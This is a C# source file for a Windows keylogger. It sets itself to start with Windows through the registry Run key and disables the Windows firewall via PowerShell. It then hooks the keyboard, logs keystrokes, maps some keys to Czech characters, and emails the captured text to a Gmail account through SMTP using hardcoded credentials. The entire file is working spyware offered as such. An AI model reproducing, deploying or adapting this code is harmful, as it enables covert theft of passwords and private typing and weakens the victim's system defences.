using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Windows.Input;
using System.Management.Automation;


namespace Keylogger
{
    class Program
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_SYSKEYDOWN = 0x0104;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        private static RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

        public static string buffer;
        
        
        static void Main(string[] args)
        {
			//Registry
            object setPath = rkApp.GetValue("MyKeylogger");
            if (setPath == null || (string)setPath != Application.ExecutablePath)
            {
                rkApp.SetValue("MyKeylogger", Application.ExecutablePath);
            }

            PowerShell ps = PowerShell.Create();
            ps.AddCommand("Set-NetFirewallProfile").AddParameter("Enabled", "False");
            ps.Invoke();
			
			//Keylogger
            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);

        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(
            int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(
            int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                buffer += (Keys)vkCode;
                if(buffer.Length > 100)
                {
                    buffer = ReplaceChars(buffer);
                    sendEmail(buffer);
                    buffer = "";
                }
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

    public static string ReplaceChars(string text)
        {
            text = text.Replace("Space", " ");
            text = text.Replace("Return", "\n");
            text = text.Replace("Delete", "<Del>");
            text = text.Replace("LShiftKey", "");
            text = text.Replace("ShiftKey", "");
            text = text.Replace("OemQuotes", "!");
            text = text.Replace("Oemcomma", "?");
            text = text.Replace("D8", "á");
            text = text.Replace("D2", "ě");
            text = text.Replace("D3", "š");
            text = text.Replace("D4", "č");
            text = text.Replace("D5", "ř");
            text = text.Replace("D6", "ž");
            text = text.Replace("D7", "ý");
            text = text.Replace("D9", "í");
            text = text.Replace("D0", "é");
            text = text.Replace("Back", "<==");
            text = text.Replace("LButton", "");
            text = text.Replace("RButton", "");
            text = text.Replace("NumPad", "");
            text = text.Replace("OemPeriod", ".");
            text = text.Replace("OemSemicolon", ",");
            text = text.Replace("Oem4", "/");
            text = text.Replace("LControlKey", "");
            text = text.Replace("ControlKey", "<CTRL>");
            text = text.Replace("Enter", "<ENT>");
            text = text.Replace("Shift", "");
            return text;
        }

        static void sendEmail(string content)
        {
            SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
            MailMessage message = new MailMessage();

            message.From = new MailAddress("joe.mama.55437@gmail.com");
            message.To.Add("joe.mama.55437@gmail.com");
            message.Subject = "Keylogger data collection";
            message.Body = content;
            client.UseDefaultCredentials = false;
            client.EnableSsl = true;
            client.Credentials = new NetworkCredential("joe.mama.55437@gmail.com", "Heslo123");

            client.Send(message);
        }

    }
}
